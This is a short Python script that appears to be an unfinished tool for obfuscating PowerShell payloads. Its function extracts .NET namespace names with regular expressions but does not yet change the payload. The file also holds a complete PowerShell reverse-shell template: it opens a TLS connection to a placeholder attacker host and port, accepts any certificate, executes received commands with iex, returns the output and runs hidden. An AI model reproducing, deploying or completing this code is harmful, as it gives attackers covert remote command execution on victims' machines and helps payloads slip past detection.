import re 

def obfuscateNamespace(payload):
    command_tokens = re.findall(r'\.[A-Z][a-zA-Z0-9_]*', payload)
  
    namespaceRegex= r'(?<=\s|\(|\.)[A-Z][a-zA-Z0-9_]*(?=\.)|(?<=\.)[A-Z][a-zA-Z0-9_]*(?=\)|\.)'
    namespaces = re.findall(namespaceRegex, payload)

    print(namespaces)
    
    return payload

def main():
    payload = input("> ")
    payload = obfuscateNamespace(payload)
    print("\n",payload)

if __name__ == "__main__":
    main()
    
template = "Start-Process $PSHOME\powershell.exe -ArgumentList {$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();$sslStream = New-Object System.Net.Security.SslStream($stream, $false, { param($sender, $certificate, $chain, $sslPolicyErrors) return $true });$sslStream.AuthenticateAsClient('localhost');[byte[]]$bytes = 0..65535|%{0};while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = try { iex $data 2>&1 | Out-String } catch { $_.Exception.Message };$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()};$client.Close()} -WindowStyle Hidden"
